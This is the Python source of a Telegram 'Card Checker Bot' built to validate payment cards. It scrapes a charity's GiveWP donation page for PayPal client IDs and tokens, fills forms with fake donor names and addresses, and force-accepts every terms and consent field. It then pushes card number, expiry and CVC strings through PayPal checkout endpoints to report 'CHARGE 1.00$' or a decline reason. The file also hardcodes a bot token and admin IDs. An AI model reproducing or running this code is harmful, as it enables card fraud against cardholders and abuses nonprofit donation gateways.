import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from telebot.types import LabeledPrice
from datetime import datetime, timedelta
import os
import html
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === استيراد UserAgent مع fallback ===
try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    uu.random
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ]
        
        @property
        def random(self):
            return random.choice(self.agents)

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            elif "message is not modified" in str(e).lower():
                return None
            else:
                break
    return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            if "429" in str(e):
                try:
                    wait_time = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None

# ═══════════════════════ Token Decoder ═══════════════════════

class TokenDecoder:
    def __init__(self):
        self.decoded_tokens = {}
    
    def decode_jwt_token(self, token):
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
            
            header_b64 = parts[0]
            header_b64 += '=' * (4 - len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            
            payload_b64 = parts[1]
            payload_b64 += '=' * (4 - len(payload_b64) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'type': 'JWT'
            }
        except:
            return None
    
    def decode_base64_token(self, token):
        try:
            padded = token + '=' * (4 - len(token) % 4)
            decoded = base64.b64decode(padded)
            try:
                return json.loads(decoded)
            except:
                return decoded.decode('utf-8', errors='ignore')
        except:
            return None
    
    def decode_paypal_access_token(self, token):
        try:
            if '.' in token:
                jwt_data = self.decode_jwt_token(token)
                if jwt_data and 'payload' in jwt_data:
                    return {
                        'type': 'PayPal Access Token',
                        'client_id': jwt_data['payload'].get('client_id', ''),
                        'scope': jwt_data['payload'].get('scope', ''),
                        'exp': jwt_data['payload'].get('exp', ''),
                        'iat': jwt_data['payload'].get('iat', ''),
                        'full_payload': jwt_data['payload']
                    }
            return None
        except:
            return None
    
    def decode_paypal_client_token(self, token):
        try:
            if '.' in token:
                jwt_data = self.decode_jwt_token(token)
                if jwt_data and 'payload' in jwt_data:
                    return {
                        'type': 'PayPal Client Token',
                        'facilitator_client_id': jwt_data['payload'].get('facilitator_client_id', ''),
                        'scope': jwt_data['payload'].get('scope', ''),
                        'exp': jwt_data['payload'].get('exp', ''),
                        'full_payload': jwt_data['payload']
                    }
            return None
        except:
            return None
    
    def decode_all_tokens(self, data_dict):
        results = {}
        for key, value in data_dict.items():
            if value and isinstance(value, str):
                if 'token' in key.lower() or 'auth' in key.lower():
                    if 'client_token' in key.lower():
                        results[key] = self.decode_paypal_client_token(value)
                    elif 'access_token' in key.lower():
                        results[key] = self.decode_paypal_access_token(value)
                    else:
                        results[key] = self.decode_jwt_token(value)
                elif 'hash' in key.lower():
                    if len(value) == 32:
                        results[key] = {'type': 'MD5 Hash', 'value': value, 'note': 'One-way - cannot reverse'}
                    elif len(value) == 40:
                        results[key] = {'type': 'SHA1 Hash', 'value': value, 'note': 'One-way - cannot reverse'}
                    elif len(value) == 64:
                        results[key] = {'type': 'SHA256 Hash', 'value': value, 'note': 'One-way - cannot reverse'}
                    else:
                        decoded = self.decode_base64_token(value)
                        if decoded:
                            results[key] = {'type': 'Base64', 'decoded': decoded}
                elif 'nonce' in key.lower():
                    decoded = self.decode_base64_token(value)
                    if decoded:
                        results[key] = {'type': 'Base64 Nonce', 'decoded': decoded}
        return results

# ═══════════════════════ PayPalCommerce Class - ناري ═══════════════════════

class PayPalCommerce:
    def __init__(self, target_url=None):
        self.first_name = [
            "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
            "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua",
            "Kevin", "Brian", "Edward", "George", "Ronald", "Teresa", "Mary", "Patricia", "Jennifer", "Linda",
            "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Nancy", "Lisa", "Betty", "Margaret",
            "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Dorothy", "Melissa"
        ]
        self.last_name = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
            "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson",
            "White", "Harris", "Clark", "Lewis", "Walker", "Rath", "Hall", "Allen", "Young", "Hernandez",
            "King", "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson",
            "Carter", "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards"
        ]
        self.donation = "1.00"
        self.minimum_amount = "1.00"
        self.currency = "USD"
        self.r = requests.Session()
        self.r.verify = False
        if HAS_FAKE_UA:
            self.uu = UserAgent()
        else:
            self.uu = SimpleUA()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
        self.url = urlparse(self.target_url).netloc
        self.inurl = urlparse(self.target_url).path
        if urlparse(self.target_url).query:
            self.inurl += f"?{urlparse(self.target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.is_valid_gateway = True
        self.token_decoder = TokenDecoder()
        self.decoded_info = {}

        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
        ]
        self.ua_index = 0

        self._init_and_extract()
        self._get_access_token()
        self._get_client_token()
        self._decode_all_tokens()

    def get_next_ua(self):
        ua = self.user_agents[self.ua_index % len(self.user_agents)]
        self.ua_index += 1
        return ua

    def _decode_all_tokens(self):
        data_to_decode = {
            'client_id': self.client_id,
            'access_token': self.access_token,
            'client_token': self.client_token,
            'form_hash': self.form_data.get('give-form-hash', ''),
            'nonce': self.form_data.get('_wpnonce', ''),
        }
        self.decoded_info = self.token_decoder.decode_all_tokens(data_to_decode)
        return self.decoded_info

    def get_decoded_tokens(self):
        if not self.decoded_info:
            self._decode_all_tokens()
        return self.decoded_info

    def get_address_data(self):
        return {
            'give-address1': '123 Main Street', 'give-address2': 'Apt 4B',
            'give_Address2': 'Apt 4B', 'give-address_2': 'Apt 4B',
            'give_address2': 'Apt 4B', 'give_address_2': 'Apt 4B',
            'address_2': 'Apt 4B', 'address2': 'Apt 4B',
            'give-city': 'New York City', 'give-state': 'NY',
            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
            'address1': '123 Main Street', 'city': 'New York City',
            'state': 'NY', 'zip': '10001', 'country': 'US', 'phone': '2125551234',
            'billing_address_2': 'Apt 4B', 'shipping_address_2': 'Apt 4B',
        }

    def get_terms_data(self):
        """تخطي الموافقة على الشروط والأحكام"""
        return {
            # GiveWP terms fields
            'give_agree_to_terms': '1',
            'give_tos_agree': '1',
            'give_terms_agreement': '1',
            'give_terms': '1',
            'agree_to_terms': '1',
            'tos_agree': '1',
            'terms_agreement': '1',
            'terms': '1',
            'give_agree': '1',
            'give_tos': '1',
            'give_terms_agree': '1',
            'give_terms_accepted': '1',
            'give_terms_consent': '1',
            'give_privacy_consent': '1',
            'give_privacy_policy': '1',
            'give_consent': '1',
            'consent': '1',
            'agree': '1',
            'accepted': '1',
            'gdpr_consent': '1',
            'gdpr_agree': '1',
            'gdpr_accept': '1',
            'privacy_consent': '1',
            'privacy_agree': '1',
            'privacy_accept': '1',
            'privacy_policy_consent': '1',
            'terms_and_conditions': '1',
            'terms_conditions': '1',
            'terms_condition': '1',
            'terms_accepted': '1',
            'terms_agree': '1',
            'terms_consent': '1',
            'terms_approval': '1',
            'terms_approved': '1',
            'accept_terms': '1',
            'accept_terms_and_conditions': '1',
            'accept_tos': '1',
            'accept_agreement': '1',
            'agreement_accepted': '1',
            'agreement_consent': '1',
            'approval': '1',
            'approved': '1',
            'accept': '1',
            'accepted_terms': '1',
            'accepted_tos': '1',
            'accepted_agreement': '1',
            'consent_given': '1',
            'consent_agreed': '1',
            'consent_accepted': '1',
            'consent_approved': '1',
        }

    def get_approval_data(self):
        """بيانات الموافقة الإجبارية"""
        return {
            'approval': 'true',
            'approved': 'true',
            'approve': 'true',
            'approval_given': 'true',
            'approval_granted': 'true',
            'consent_given': 'true',
            'consent_approved': 'true',
            'consent_agreed': 'true',
            'consent_accepted': 'true',
            'consent': 'true',
            'agree': 'true',
            'agreed': 'true',
            'accepted': 'true',
            'accept': 'true',
        }

    def get_base_form_data(self):
        form_data = self.form_data.copy()
        first_name = random.choice(self.first_name)
        last_name = random.choice(self.last_name)
        form_data.update({
            'give-amount': self.minimum_amount, 'give-currency': self.currency,
            'currency': self.currency, 'payment-mode': 'paypal-commerce',
            'give_first': first_name, 'give_last': last_name,
            'first_name': first_name, 'last_name': last_name,
            'give_email': self.email, 'email': self.email,
            'give-gateway': 'paypal-commerce', 'give_company': '',
            'give_comment': '', 'give_anonymous': '0',
        })
        form_data.update(self.get_address_data())
        form_data.update(self.get_terms_data())
        form_data.update(self.get_approval_data())
        return form_data

    def _extract_minimum_amount(self, html):
        try:
            patterns = [
                r'minimum donation amount of \$([\d.]+)',
                r'minimum donation amount of &euro;([\d.]+)',
                r'minimum donation amount of €([\d.]+)',
                r'minimum donation amount of £([\d.]+)',
                r'minimum donation amount[^\d]*([\d.]+)',
                r'data-min-amount=["\']([\d.]+)["\']',
                r'data-minimum-amount=["\']([\d.]+)["\']',
                r'min-amount=["\']([\d.]+)["\']',
                r'minimum_amount=["\']([\d.]+)["\']',
                r'min_amount=["\']([\d.]+)["\']',
            ]
            for pattern in patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    amount = match.group(1)
                    try:
                        float(amount)
                        self.minimum_amount = amount
                        return
                    except:
                        continue
            self.minimum_amount = "1.00"
        except:
            self.minimum_amount = "1.00"

    def _is_not_paypal_page(self, html):
        if not html:
            return True
        indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp']
        return not any(ind in html.lower() for ind in indicators)

    def _init_and_extract(self):
        try:
            headers = {
                'user-agent': self.get_next_ua(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9'
            }
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            html = response.text
            if self._is_not_paypal_page(html):
                self.is_valid_gateway = False
                return
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
            self._extract_minimum_amount(html)
        except:
            self.is_valid_gateway = False

    def _extract_client_id(self, html):
        patterns = [
            r'client-id="([^"]+)"', 
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-client-id="([^"]+)"', 
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', 
            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-paypal-client-id="([^"]+)"',
            r'data-client-token="([^"]+)"',
            r'client-id\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'clientId\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'merchant-id\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'
        elif 'ajaxurl' in html:
            match = re.search(r'ajaxurl["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
            if match:
                self.ajax_url = match.group(1)
                if not self.ajax_url.startswith('http'):
                    self.ajax_url = f'https://{self.url}{self.ajax_url}'

    def _get_access_token(self):
        if not self.client_id:
            return None
        try:
            headers = {
                'user-agent': self.get_next_ua(), 
                'accept': 'application/json', 
                'content-type': 'application/x-www-form-urlencoded',
                'accept-language': 'en_US'
            }
            response = self.r.post(
                'https://api-m.paypal.com/v1/oauth2/token', 
                headers=headers, 
                data={'grant_type': 'client_credentials'}, 
                auth=(self.client_id, ''), 
                timeout=15
            )
            if response.status_code == 200:
                self.access_token = response.json().get('access_token')
                return self.access_token
        except:
            pass
        return None

    def _get_client_token(self):
        if not self.ajax_url:
            return None
        try:
            actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token']
            for action in actions:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {
                    'user-agent': self.get_next_ua(), 
                    'x-requested-with': 'XMLHttpRequest', 
                    'origin': f'https://{self.url}', 
                    'referer': f'https://{self.url}{self.inurl}', 
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'accept': 'application/json, text/javascript, */*; q=0.01'
                }
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict):
                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
                            elif isinstance(json_data['data'], str):
                                self.client_token = json_data['data']
                            if self.client_token:
                                return self.client_token
                    except:
                        pass
            return None
        except:
            return None

    def _create_order(self):
        if not self.is_valid_gateway:
            return None
        
        # الطريقة 1: عبر AJAX (GiveWP)
        if self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        
        # الطريقة 2: عبر API مباشرة مع access_token
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        
        # الطريقة 3: عبر client_token
        if self.client_token:
            order_id = self._create_order_with_client_token()
            if order_id:
                return order_id
        
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        amounts = []
        if self.minimum_amount != "1.00":
            amounts.append(self.minimum_amount)
        amounts.extend(["1.00", "5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
        
        headers = {
            'user-agent': self.get_next_ua(), 
            'accept': 'application/json, text/javascript, */*; q=0.01', 
            'x-requested-with': 'XMLHttpRequest', 
            'origin': f'https://{self.url}', 
            'referer': f'https://{self.url}{self.inurl}', 
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        
        for amount in amounts:
            form_data = self.get_base_form_data()
            form_data['give-amount'] = amount
            form_data['amount'] = amount
            
            for action in actions:
                params = {'action': action}
                try:
                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                    if response.status_code == 200 and response.text:
                        try:
                            json_data = response.json()
                            if 'data' in json_data:
                                if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                    return json_data['data']['id']
                                elif isinstance(json_data['data'], str):
                                    return json_data['data']
                            if 'id' in json_data:
                                return json_data['id']
                            if 'order_id' in json_data:
                                return json_data['order_id']
                            if 'orderID' in json_data:
                                return json_data['orderID']
                        except:
                            pass
                except:
                    continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.access_token}', 
                'content-type': 'application/json', 
                'user-agent': self.get_next_ua(), 
                'accept': 'application/json',
                'paypal-request-id': str(random.randint(1000000000, 9999999999))
            }
            data = {
                'intent': 'CAPTURE', 
                'purchase_units': [{
                    'amount': {
                        'currency_code': self.currency, 
                        'value': self.donation
                    }
                }], 
                'application_context': {
                    'shipping_preference': 'NO_SHIPPING', 
                    'user_action': 'PAY_NOW'
                }
            }
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _create_order_with_client_token(self):
        if not self.client_token:
            return None
        try:
            headers = {
                'authorization': f'Bearer {self.client_token}', 
                'content-type': 'application/json', 
                'user-agent': self.get_next_ua(), 
                'accept': 'application/json'
            }
            data = {
                'intent': 'CAPTURE', 
                'purchase_units': [{
                    'amount': {
                        'currency_code': self.currency, 
                        'value': self.donation
                    }
                }]
            }
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _approve_order(self, order_id):
        # الطريقة 1: عبر AJAX (GiveWP)
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        
        # الطريقة 2: عبر API مباشرة
        if self.access_token:
            try:
                headers = {
                    'authorization': f'Bearer {self.access_token}', 
                    'content-type': 'application/json', 
                    'user-agent': self.get_next_ua()
                }
                response = self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', 
                    headers=headers, 
                    timeout=15
                )
                return response
            except:
                pass
        
        # الطريقة 3: عبر client_token
        if self.client_token:
            try:
                headers = {
                    'authorization': f'Bearer {self.client_token}', 
                    'content-type': 'application/json', 
                    'user-agent': self.get_next_ua()
                }
                response = self.r.post(
                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', 
                    headers=headers, 
                    timeout=15
                )
                return response
            except:
                pass
        
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        amounts = []
        if self.minimum_amount != "1.00":
            amounts.append(self.minimum_amount)
        amounts.extend(["1.00", "5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
        
        headers = {
            'user-agent': self.get_next_ua(), 
            'accept': 'application/json, text/javascript, */*; q=0.01', 
            'x-requested-with': 'XMLHttpRequest', 
            'origin': f'https://{self.url}', 
            'referer': f'https://{self.url}{self.inurl}', 
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        
        for amount in amounts:
            form_data = self.get_base_form_data()
            form_data['give-amount'] = amount
            form_data['amount'] = amount
            
            for action in actions:
                params = {'action': action, 'order': order_id}
                try:
                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                    if response.status_code == 200:
                        return response
                except:
                    continue
        return None

    def Charge(self, ccx):
        try:
            if not self.is_valid_gateway:
                return "INVALID_GATEWAY"
            
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"
            
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"
            
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            
            confirm_success = False
            confirm_text = ""
            
            for auth_token in auth_tokens:
                headers = {
                    'authorization': f'Bearer {auth_token}', 
                    'paypal-client-metadata-id': self.client_id or '', 
                    'user-agent': self.get_next_ua(),
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'paypal-request-id': str(random.randint(1000000000, 9999999999)),
                    'x-paypal-consent': 'accepted',
                    'x-paypal-approval': 'approved',
                    'x-paypal-terms': 'accepted',
                }
                data = {
                    'payment_source': {
                        'card': {
                            'number': n, 
                            'expiry': expiry, 
                            'security_code': cvc, 
                            'name': f"{random.choice(self.first_name)} {random.choice(self.last_name)}",
                            'billing_address': {
                                'address_line_1': '123 Main Street',
                                'address_line_2': 'Apt 4B',
                                'admin_area_1': 'NY',
                                'admin_area_2': 'New York City',
                                'postal_code': '10001',
                                'country_code': 'US'
                            },
                            'attributes': {
                                'verification': {
                                    'method': 'SCA_WHEN_REQUIRED'
                                }
                            }
                        }
                    }, 
                    'application_context': {
                        'vault': False,
                        'user_action': 'PAY_NOW',
                        'shipping_preference': 'NO_SHIPPING',
                        'payment_method_preference': 'IMMEDIATE_PAYMENT_REQUIRED',
                    }
                }
                
                try:
                    confirm_res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', 
                        headers=headers, 
                        json=data, 
                        timeout=15
                    )
                    confirm_text = confirm_res.text
                    
                    if confirm_res.status_code in [200, 201]:
                        confirm_success = True
                        break
                    
                    if confirm_res.status_code in [400, 422]:
                        try:
                            error_json = confirm_res.json()
                            if 'details' in error_json and len(error_json['details']) > 0:
                                detail = error_json['details'][0]
                                issue = detail.get('issue', '')
                                if issue:
                                    return issue
                            if 'name' in error_json:
                                return error_json['name']
                            if 'message' in error_json:
                                return error_json['message']
                        except:
                            pass
                        
                        issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
                        if issue_matches:
                            return issue_matches[0]
                        
                        name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
                        if name_matches:
                            return name_matches[0]
                        
                        message_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', confirm_text)
                        if message_matches:
                            return message_matches[0]
                        
                        return "DECLINED"
                        
                except:
                    continue
            
            approve_res = self._approve_order(order_id)
            if approve_res:
                text = approve_res.text
                
                if approve_res.status_code in [200, 201]:
                    if text.strip().lower() == 'true':
                        return 'CHARGE 1.00$'
                    if 'true' in text.lower():
                        return 'CHARGE 1.00$'
                    if 'success' in text.lower():
                        return 'CHARGE 1.00$'
                    
                    try:
                        json_data = approve_res.json()
                        if isinstance(json_data, dict):
                            if json_data.get('success') == True:
                                return 'CHARGE 1.00$'
                            if json_data.get('status') == 'COMPLETED':
                                return 'CHARGE 1.00$'
                            if 'data' in json_data and isinstance(json_data['data'], dict):
                                if 'error' in json_data['data']:
                                    return str(json_data['data']['error'])
                            if 'error' in json_data:
                                return str(json_data['error'])
                            if 'message' in json_data:
                                return str(json_data['message'])
                    except:
                        pass
                    
                    issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', text)
                    if issue_matches:
                        return issue_matches[0]
                    
                    name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', text)
                    if name_matches:
                        return name_matches[0]
                    
                    message_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', text)
                    if message_matches:
                        return message_matches[0]
                    
                    if 'insufficient' in text.lower():
                        return 'INSUFFICIENT_FUNDS'
                    
                    return "DECLINED"
                else:
                    try:
                        json_data = approve_res.json()
                        if isinstance(json_data, dict):
                            if 'data' in json_data and isinstance(json_data['data'], dict):
                                if 'error' in json_data['data']:
                                    return str(json_data['data']['error'])
                            if 'error' in json_data:
                                return str(json_data['error'])
                            if 'message' in json_data:
                                return str(json_data['message'])
                    except:
                        pass
                    
                    issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', text)
                    if issue_matches:
                        return issue_matches[0]
                    
                    name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', text)
                    if name_matches:
                        return name_matches[0]
                    
                    message_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', text)
                    if message_matches:
                        return message_matches[0]
                    
                    if 'insufficient' in text.lower():
                        return 'INSUFFICIENT_FUNDS'
                    
                    return "DECLINED"
            
            return "DECLINED"
            
        except Exception as e:
            return f"Error: {e}"

# ═══════════════════════ أوامر البوت ═══════════════════════

@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return 
    
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal 
[⚡] Mass Extract >> /mass
[⚡] Decode Tokens >> /decode
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    
    safe_send_message(message.chat.id, IU, reply_markup=FRA)

@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("Back", callback_data="start")
    Atty.add(back)
    YTT = f'''Welcome {userr} Send your message and the admin will respond.'''
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=YTT, parse_mode='HTML', reply_markup=Atty)
    except Exception as e:
        print(f"Feedback error: {e}")
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
